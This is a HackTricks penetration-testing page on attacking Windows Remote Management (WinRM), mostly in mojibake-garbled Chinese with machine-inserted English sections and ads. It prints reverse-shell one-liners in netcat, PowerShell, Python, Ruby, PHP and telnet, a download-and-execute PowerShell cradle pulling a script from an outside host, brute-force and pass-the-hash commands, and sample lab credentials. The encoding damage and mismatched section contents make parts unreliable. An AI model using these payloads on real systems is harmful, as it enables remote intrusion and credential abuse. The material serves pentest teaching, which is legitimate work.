# 5985,5986 - WinRMæ¸—é€æµ‹è¯•

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofæ˜¯æ‰€æœ‰åŠ å¯†æ¼æ´èµé‡‘çš„å®¶å›­ã€‚**

**æ— éœ€å»¶è¿Ÿè·å¾—å¥–åŠ±**\
HackenProofçš„èµé‡‘åªæœ‰åœ¨å®¢æˆ·å­˜å…¥å¥–åŠ±é¢„ç®—åæ‰ä¼šå¯åŠ¨ã€‚åœ¨æ¼æ´éªŒè¯åï¼Œæ‚¨å°†è·å¾—å¥–åŠ±ã€‚

**åœ¨web3æ¸—é€æµ‹è¯•ä¸­è·å¾—ç»éªŒ**\
åŒºå—é“¾åè®®å’Œæ™ºèƒ½åˆçº¦æ˜¯æ–°çš„äº’è”ç½‘ï¼åœ¨å…¶å…´èµ·çš„æ—¥å­é‡ŒæŒæ¡web3å®‰å…¨ã€‚

**æˆä¸ºweb3é»‘å®¢ä¼ å¥‡**\
æ¯æ¬¡éªŒè¯çš„æ¼æ´éƒ½ä¼šè·å¾—å£°èª‰ç§¯åˆ†ï¼Œå¹¶å æ®æ¯å‘¨æ’è¡Œæ¦œçš„æ¦œé¦–ã€‚

[**åœ¨HackenProofä¸Šæ³¨å†Œ**](https://hackenproof.com/register)å¼€å§‹ä»æ‚¨çš„é»‘å®¢æ”»å‡»ä¸­è·åˆ©ï¼

{% embed url="https://hackenproof.com/register" %}

## WinRM

[Windowsè¿œç¨‹ç®¡ç†](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426\(v=vs.85\).aspx)ï¼ˆWinRMï¼‰æ˜¯ä¸€ç§å¾®è½¯åè®®ï¼Œ**å…è®¸é€šè¿‡HTTP(S)ä½¿ç”¨SOAPè¿œç¨‹ç®¡ç†Windowsæœºå™¨**ã€‚åœ¨åç«¯ï¼Œå®ƒä½¿ç”¨WMIï¼Œå› æ­¤æ‚¨å¯ä»¥å°†å…¶è§†ä¸ºåŸºäºHTTPçš„WMI APIã€‚

å¦‚æœæœºå™¨ä¸Šå¯ç”¨äº†WinRMï¼Œåˆ™å¯ä»¥è½»æ¾åœ°ä»PowerShellè¿œç¨‹ç®¡ç†è¯¥æœºå™¨ã€‚å®é™…ä¸Šï¼Œæ‚¨å¯ä»¥åƒä½¿ç”¨SSHä¸€æ ·è¿›å…¥æœºå™¨ä¸Šçš„è¿œç¨‹PowerShellä¼šè¯ï¼

æ£€æµ‹WinRMæ˜¯å¦å¯ç”¨çš„æœ€ç®€å•æ–¹æ³•æ˜¯æŸ¥çœ‹ç«¯å£æ˜¯å¦æ‰“å¼€ã€‚WinRMå°†ç›‘å¬ä»¥ä¸‹ä¸¤ä¸ªç«¯å£ï¼š

* **5985/tcpï¼ˆHTTPï¼‰**
* **5986/tcpï¼ˆHTTPSï¼‰**

å¦‚æœå…¶ä¸­ä¸€ä¸ªç«¯å£æ‰“å¼€ï¼Œè¡¨ç¤ºå·²é…ç½®WinRMï¼Œæ‚¨å¯ä»¥å°è¯•è¿›å…¥è¿œç¨‹ä¼šè¯ã€‚

## **å¯åŠ¨WinRMä¼šè¯**ã€‚

æˆ‘ä»¬å¯ä»¥é…ç½®PowerShellä¸WinRMä¸€èµ·å·¥ä½œã€‚æ ¹æ®Microsoftçš„æ–‡æ¡£ï¼ŒEnable-PSRemotingæ˜¯ä¸€ä¸ªé…ç½®è®¡ç®—æœºä»¥æ¥æ”¶PowerShellè¿œç¨‹å‘½ä»¤çš„cmdletã€‚å¦‚æœæˆ‘ä»¬å¯ä»¥åœ¨å—å®³è€…ä¸Šè®¿é—®æå‡çš„PowerShellæç¤ºç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥å¯ç”¨å®ƒå¹¶å°†ä»»ä½•"æ”»å‡»è€…"æ·»åŠ ä¸ºå—ä¿¡ä»»çš„ä¸»æœºã€‚æˆ‘ä»¬å¯ä»¥è¿è¡Œä»¥ä¸‹ä¸¤ä¸ªå‘½ä»¤ï¼š
```
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
è¿™å°†åœ¨trustedhostsè®¾ç½®ä¸­æ·»åŠ é€šé…ç¬¦ã€‚è¯·æ³¨æ„å…¶ä¸­çš„å«ä¹‰ã€‚æ³¨æ„ï¼šæˆ‘è¿˜å¿…é¡»å°†æ”»å‡»æœºå™¨ä¸Šçš„ç½‘ç»œç±»å‹ä»â€œå…¬å…±â€æ›´æ”¹ä¸ºâ€œå·¥ä½œâ€ç½‘ç»œã€‚

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨wmicè¿œç¨‹æ¿€æ´»WinRMã€‚
```
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
### æµ‹è¯•æ˜¯å¦å·²é…ç½®

ä¸€æ—¦æ”»å‡»æœºå™¨å·²é…ç½®å¥½ï¼Œä½¿ç”¨`Test-WSMan`å‡½æ•°æ¥æµ‹è¯•ç›®æ ‡æ˜¯å¦å·²é…ç½®ä¸ºWinRMã€‚æ‚¨åº”è¯¥ä¼šçœ‹åˆ°ä¸€äº›å…³äºåè®®ç‰ˆæœ¬å’Œwsmidçš„è¿”å›ä¿¡æ¯ï¼š

![](<../.gitbook/assets/image (161) (1).png>)

![](<../.gitbook/assets/image (162).png>)

åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç¬¬ä¸€ä¸ªå·²ç»é…ç½®å¥½äº†ï¼Œè€Œç¬¬äºŒä¸ªæ²¡æœ‰ã€‚

### æ‰§è¡Œå‘½ä»¤

ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨PowerShellçš„`Invoke-Command`åœ¨ç›®æ ‡ä¸Šé€šè¿‡WinRMè¿œç¨‹æ‰§è¡Œå‘½ä»¤ã€‚è¦è¿œç¨‹è¿è¡Œ`ipconfig`å¹¶æŸ¥çœ‹è¾“å‡ºï¼š
```
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../.gitbook/assets/image (163) (1).png>)

æ‚¨è¿˜å¯ä»¥é€šè¿‡**Invoke-Command**åœ¨å½“å‰çš„PSæ§åˆ¶å°ä¸­æ‰§è¡Œå‘½ä»¤ã€‚å‡è®¾æ‚¨åœ¨æœ¬åœ°æœ‰ä¸€ä¸ªåä¸º**enumeration**çš„å‡½æ•°ï¼Œå¹¶ä¸”æ‚¨æƒ³åœ¨è¿œç¨‹è®¡ç®—æœºä¸Šæ‰§è¡Œå®ƒï¼Œæ‚¨å¯ä»¥è¿™æ ·åšï¼š
```ruby
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### æ‰§è¡Œè„šæœ¬

To execute a script on a target machine through WinRM, you can use the `Invoke-Command` cmdlet in PowerShell. This cmdlet allows you to run commands or scripts on remote computers.

```powershell
Invoke-Command -ComputerName <target> -ScriptBlock {<script>}
```

Replace `<target>` with the IP address or hostname of the target machine, and `<script>` with the script you want to execute.

For example, to execute a PowerShell script named `script.ps1` on a target machine with the IP address `192.168.1.100`, you would use the following command:

```powershell
Invoke-Command -ComputerName 192.168.1.100 -ScriptBlock {C:\path\to\script.ps1}
```

Make sure to provide the correct path to the script on the target machine.

Note that you may need to authenticate with valid credentials to execute the script successfully.
```ruby
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### è·å–åå‘Shell

To get a reverse shell, you can use the following methods:

#### Method 1: Netcat

1. Start a listener on your machine: `nc -lvp <port>`.
2. Execute the following command on the target machine: `nc <your_ip> <port> -e /bin/bash`.

#### Method 2: PowerShell

1. Start a listener on your machine: `nc -lvp <port>`.
2. Execute the following command on the target machine: `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<your_ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`.

#### Method 3: Python

1. Start a listener on your machine: `nc -lvp <port>`.
2. Execute the following command on the target machine: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`.

#### Method 4: Ruby

1. Start a listener on your machine: `nc -lvp <port>`.
2. Execute the following command on the target machine: `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<your_ip>",<port>);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`.

#### Method 5: PHP

1. Start a listener on your machine: `nc -lvp <port>`.
2. Execute the following command on the target machine: `php -r '$sock=fsockopen("<your_ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'`.

#### Method 6: Telnet

1. Start a listener on your machine: `nc -lvp <port>`.
2. Execute the following command on the target machine: `telnet <your_ip> <port> | /bin/bash | telnet <your_ip> <port>`.

Remember to replace `<your_ip>` with your machine's IP address and `<port>` with the desired port number.
```ruby
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### è·å–ä¸€ä¸ªPSä¼šè¯

æˆ–è€…ï¼Œå¦‚æœä½ æƒ³ç›´æ¥è¿›å…¥ä¸€ä¸ªäº¤äº’å¼çš„PowerShellä¼šè¯ï¼Œå¯ä»¥ä½¿ç”¨`Enter-PSSession`å‡½æ•°ï¼š
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../.gitbook/assets/image (164).png>)

**ä¼šè¯å°†åœ¨â€œå—å®³è€…â€å†…çš„æ–°è¿›ç¨‹ï¼ˆwsmprovhostï¼‰ä¸­è¿è¡Œ**

### **å¼ºåˆ¶æ‰“å¼€WinRM**

å¦‚æœæ‚¨çœŸçš„æƒ³ä½¿ç”¨PS Remotingå’ŒWinRMï¼Œä½†ç›®æ ‡æ²¡æœ‰é…ç½®å®ƒï¼Œæ‚¨å¯ä»¥é€šè¿‡ä¸€ä¸ªå‘½ä»¤æ¥â€œå¼ºåˆ¶â€æ‰“å¼€å®ƒã€‚æˆ‘ä¸å»ºè®®è¿™æ ·åšï¼Œä½†å¦‚æœæ‚¨çœŸçš„æƒ³ä½¿ç”¨WinRMæˆ–PSRemotingï¼Œé‚£ä¹ˆå¯ä»¥è¿™æ ·åšã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨PSExecï¼š
```
PS C:\tools\SysinternalsSuite> .\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
ç°åœ¨æˆ‘ä»¬å¯ä»¥åœ¨å—å®³è€…ä¸Šè¿›å…¥è¿œç¨‹PSä¼šè¯ã€‚

### ä¿å­˜å’Œæ¢å¤ä¼šè¯

å¦‚æœè¿œç¨‹è®¡ç®—æœºçš„è¯­è¨€å—é™ï¼Œåˆ™æ­¤æ–¹æ³•**æ— æ³•æ­£å¸¸å·¥ä½œ**ã€‚
```ruby
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
åœ¨è¿™ä¸ªä¼šè¯ä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨_Invoke-Command_åŠ è½½PSè„šæœ¬ã€‚
```ruby
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### é”™è¯¯

å¦‚æœä½ é‡åˆ°ä»¥ä¸‹é”™è¯¯ï¼š

`enter-pssession : è¿æ¥åˆ°è¿œç¨‹æœåŠ¡å™¨ 10.10.10.175 å¤±è´¥ï¼Œé”™è¯¯ä¿¡æ¯å¦‚ä¸‹ï¼šWinRM å®¢æˆ·ç«¯æ— æ³•å¤„ç†è¯·æ±‚ã€‚å¦‚æœèº«ä»½éªŒè¯æ–¹æ¡ˆä¸ Kerberos ä¸åŒï¼Œæˆ–è€…å®¢æˆ·ç«¯è®¡ç®—æœºæœªåŠ å…¥åŸŸï¼Œåˆ™å¿…é¡»ä½¿ç”¨ HTTPS ä¼ è¾“æˆ–å°†ç›®æ ‡æœºå™¨æ·»åŠ åˆ° TrustedHosts é…ç½®è®¾ç½®ä¸­ã€‚ä½¿ç”¨ winrm.cmd æ¥é…ç½® TrustedHostsã€‚è¯·æ³¨æ„ï¼ŒTrustedHosts åˆ—è¡¨ä¸­çš„è®¡ç®—æœºå¯èƒ½æœªç»è¿‡èº«ä»½éªŒè¯ã€‚ä½ å¯ä»¥é€šè¿‡è¿è¡Œä»¥ä¸‹å‘½ä»¤è·å–æ›´å¤šä¿¡æ¯ï¼šwinrm help configã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜… about_Remote_Troubleshooting å¸®åŠ©ä¸»é¢˜ã€‚`

åœ¨å®¢æˆ·ç«¯å°è¯•ä»¥ä¸‹æ“ä½œï¼ˆå‚è€ƒ[è¿™é‡Œ](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)ï¼‰ï¼š
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof æ˜¯æ‰€æœ‰åŠ å¯†æ¼æ´èµé‡‘çš„å®¶å›­ã€‚**

**å³æ—¶è·å¾—å¥–åŠ±**\
HackenProof çš„èµé‡‘åªæœ‰åœ¨å®¢æˆ·å­˜å…¥å¥–åŠ±é¢„ç®—åæ‰ä¼šå¯åŠ¨ã€‚åœ¨æ¼æ´éªŒè¯åï¼Œæ‚¨å°†è·å¾—å¥–åŠ±ã€‚

**åœ¨ web3 æ¸—é€æµ‹è¯•ä¸­ç§¯ç´¯ç»éªŒ**\
åŒºå—é“¾åè®®å’Œæ™ºèƒ½åˆçº¦æ˜¯æ–°çš„äº’è”ç½‘ï¼åœ¨å…¶å…´èµ·çš„æ—¶ä»£æŒæ¡ web3 å®‰å…¨ã€‚

**æˆä¸º web3 é»‘å®¢ä¼ å¥‡**\
æ¯æ¬¡éªŒè¯çš„æ¼æ´éƒ½ä¼šè·å¾—å£°æœ›ç§¯åˆ†ï¼Œå¹¶ç™»ä¸Šæ¯å‘¨æ’è¡Œæ¦œçš„æ¦œé¦–ã€‚

[**åœ¨ HackenProof ä¸Šæ³¨å†Œ**](https://hackenproof.com/register) å¼€å§‹ä»æ‚¨çš„é»‘å®¢æ”»å‡»ä¸­èµšå–æ”¶å…¥ï¼

{% embed url="https://hackenproof.com/register" %}

## åœ¨ Linux ä¸­è¿›è¡Œ WinRM è¿æ¥

### æš´åŠ›ç ´è§£

è¯·æ³¨æ„ï¼Œæš´åŠ›ç ´è§£ WinRM å¯èƒ½ä¼šé˜»æ­¢ç”¨æˆ·ã€‚
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### ä½¿ç”¨ evil-winrm

Evil-winrm æ˜¯ä¸€æ¬¾ç”¨äºåœ¨ Windows è¿œç¨‹ç®¡ç†æœåŠ¡ï¼ˆWinRMï¼‰ä¸Šè¿›è¡Œæ¸—é€æµ‹è¯•çš„å·¥å…·ã€‚å®ƒæä¾›äº†ä¸€ä¸ªç®€å•è€Œå¼ºå¤§çš„æ–¹å¼æ¥ä¸ç›®æ ‡ç³»ç»Ÿè¿›è¡Œäº¤äº’ï¼Œå¹¶æ‰§è¡Œå„ç§æ”»å‡»æ“ä½œã€‚

#### å®‰è£… evil-winrm

è¦å®‰è£… evil-winrmï¼Œå¯ä»¥ä½¿ç”¨ Ruby çš„åŒ…ç®¡ç†å™¨ gem è¿›è¡Œå®‰è£…ã€‚åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```bash
gem install evil-winrm
```

#### è¿æ¥åˆ°ç›®æ ‡ç³»ç»Ÿ

ä½¿ç”¨ evil-winrm è¿æ¥åˆ°ç›®æ ‡ç³»ç»Ÿéå¸¸ç®€å•ã€‚åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```bash
evil-winrm -i <ç›®æ ‡ IP> -u <ç”¨æˆ·å> -p <å¯†ç >
```

æ›¿æ¢ `<ç›®æ ‡ IP>`ã€`<ç”¨æˆ·å>` å’Œ `<å¯†ç >` ä¸ºå®é™…çš„ç›®æ ‡ç³»ç»Ÿ IP åœ°å€ã€ç”¨æˆ·åå’Œå¯†ç ã€‚

#### æ‰§è¡Œå‘½ä»¤

è¿æ¥æˆåŠŸåï¼Œæ‚¨å¯ä»¥åœ¨ evil-winrm æä¾›çš„äº¤äº’å¼å‘½ä»¤è¡Œä¸­æ‰§è¡Œå„ç§å‘½ä»¤ã€‚ä¾‹å¦‚ï¼Œè¦åˆ—å‡ºç›®æ ‡ç³»ç»Ÿä¸Šçš„ç”¨æˆ·ï¼Œå¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```bash
shell whoami
```

#### ä¸Šä¼ å’Œä¸‹è½½æ–‡ä»¶

ä½¿ç”¨ evil-winrmï¼Œæ‚¨è¿˜å¯ä»¥ä¸Šä¼ å’Œä¸‹è½½æ–‡ä»¶åˆ°ç›®æ ‡ç³»ç»Ÿã€‚è¦ä¸Šä¼ æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```bash
upload <æœ¬åœ°æ–‡ä»¶è·¯å¾„> <ç›®æ ‡æ–‡ä»¶è·¯å¾„>
```

è¦ä¸‹è½½æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```bash
download <ç›®æ ‡æ–‡ä»¶è·¯å¾„> <æœ¬åœ°æ–‡ä»¶è·¯å¾„>
```

æ›¿æ¢ `<æœ¬åœ°æ–‡ä»¶è·¯å¾„>` å’Œ `<ç›®æ ‡æ–‡ä»¶è·¯å¾„>` ä¸ºå®é™…çš„æœ¬åœ°æ–‡ä»¶è·¯å¾„å’Œç›®æ ‡æ–‡ä»¶è·¯å¾„ã€‚

#### é€€å‡ºè¿æ¥

è¦é€€å‡º evil-winrm è¿æ¥ï¼Œå¯ä»¥åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š

```bash
exit
```

è¿™å°†å…³é—­ä¸ç›®æ ‡ç³»ç»Ÿçš„è¿æ¥ã€‚

#### æ³¨æ„äº‹é¡¹

åœ¨ä½¿ç”¨ evil-winrm è¿›è¡Œæ¸—é€æµ‹è¯•æ—¶ï¼Œè¯·åŠ¡å¿…éµå®ˆæ³•å¾‹å’Œé“å¾·è§„èŒƒã€‚ä»…åœ¨è·å¾—åˆæ³•æˆæƒçš„æƒ…å†µä¸‹ä½¿ç”¨è¯¥å·¥å…·ï¼Œå¹¶ä¸”ä»…é™äºåˆæ³•çš„æ¸—é€æµ‹è¯•æ´»åŠ¨ã€‚
```ruby
gem install evil-winrm
```
é˜…è¯»å…¶githubä¸Šçš„**æ–‡æ¡£**ï¼š[https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
è¦ä½¿ç”¨evil-winrmè¿æ¥åˆ°ä¸€ä¸ªIPv6åœ°å€ï¼Œåœ¨/etc/hostsä¸­åˆ›å»ºä¸€ä¸ªæ¡ç›®ï¼Œå°†ä¸€ä¸ªåŸŸåè®¾ç½®ä¸ºè¯¥IPv6åœ°å€ï¼Œå¹¶è¿æ¥åˆ°è¯¥åŸŸåã€‚

### ä½¿ç”¨evil-winrmä¼ é€’å“ˆå¸Œå€¼
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
![](<../.gitbook/assets/image (173).png>)

### ä½¿ç”¨PS-dockeræœºå™¨

PS-dockeræ˜¯ä¸€ç§åˆ©ç”¨Dockerå®¹å™¨æ¥æ‰§è¡ŒPowerShellè„šæœ¬çš„æŠ€æœ¯ã€‚é€šè¿‡ä½¿ç”¨PS-dockeræœºå™¨ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡ŒPowerShellå‘½ä»¤ï¼Œä»¥ä¾¿è¿›è¡Œæ¸—é€æµ‹è¯•å’Œæ”»å‡»ã€‚

è¦ä½¿ç”¨PS-dockeræœºå™¨ï¼Œæˆ‘ä»¬éœ€è¦å…ˆå®‰è£…Dockerï¼Œå¹¶ç¡®ä¿DockeræœåŠ¡æ­£åœ¨è¿è¡Œã€‚ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ›å»ºä¸€ä¸ªPS-dockeræœºå™¨ï¼š

```plaintext
docker run -it --rm mcr.microsoft.com/powershell
```

è¿™å°†ä¸‹è½½å¹¶è¿è¡Œä¸€ä¸ªåŒ…å«PowerShellçš„Dockerå®¹å™¨ã€‚ä¸€æ—¦å®¹å™¨å¯åŠ¨ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨å®¹å™¨ä¸­æ‰§è¡ŒPowerShellå‘½ä»¤ã€‚

è¦è¿æ¥åˆ°ç›®æ ‡ç³»ç»Ÿçš„WinRMæœåŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```plaintext
Enter-PSSession -ComputerName <target_ip> -Port <winrm_port> -Credential <credentials>
```

å…¶ä¸­ï¼Œ`<target_ip>`æ˜¯ç›®æ ‡ç³»ç»Ÿçš„IPåœ°å€ï¼Œ`<winrm_port>`æ˜¯WinRMæœåŠ¡çš„ç«¯å£å·ï¼Œ`<credentials>`æ˜¯ç”¨äºèº«ä»½éªŒè¯çš„å‡­æ®ã€‚

ä¸€æ—¦è¿æ¥æˆåŠŸï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œå„ç§PowerShellå‘½ä»¤ï¼ŒåŒ…æ‹¬æ‰§è¡Œè¿œç¨‹ä»£ç ã€æŸ¥æ‰¾æ•æ„Ÿä¿¡æ¯ç­‰ã€‚

è¯·æ³¨æ„ï¼Œä½¿ç”¨PS-dockeræœºå™¨éœ€è¦å…·æœ‰é€‚å½“çš„æƒé™å’Œæˆæƒï¼Œä¸”ä»…é™äºåˆæ³•çš„æ¸—é€æµ‹è¯•å’Œæˆæƒæ´»åŠ¨ã€‚
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### ä½¿ç”¨Rubyè„šæœ¬

ä»è¿™é‡Œæå–çš„ä»£ç ï¼š[https://alamot.github.io/winrm\_shell/](https://alamot.github.io/winrm\_shell/)
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

* `port:5985 Microsoft-HTTPAPI`

## å‚è€ƒèµ„æ–™

* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## HackTricks è‡ªåŠ¨å‘½ä»¤
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p â€˜MySuperSecr3tPass123!â€™

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

